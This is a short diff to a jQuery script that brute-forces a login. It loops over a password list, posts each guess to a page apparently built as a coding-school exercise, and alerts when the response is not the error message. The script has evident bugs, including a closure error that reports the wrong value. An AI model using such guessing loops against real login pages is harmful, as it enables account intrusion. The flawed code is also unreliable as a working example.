@@ -9,13 +9,16 @@ $.ajax({
 
 
 $(document).ajaxComplete(function () {
-	for (var i = 0; i < 10; i++) {
+	for (var i = 0; i < psw.length; i++) {
 		$.ajax({
 			url: "http://docusland.fr/code-academie/js_bruteforce/index.php"
 			, password: psw[i]
 			, complete: function (answer) {
-				return true;
-		}
+				var wrong = "<div style='color:red; font-size:18px'>Erroneous password</div>";
+				if (answer.responseText != wrong) {
+					alert(psw[i]);
+				}
+			}
 		});
 	}
 });
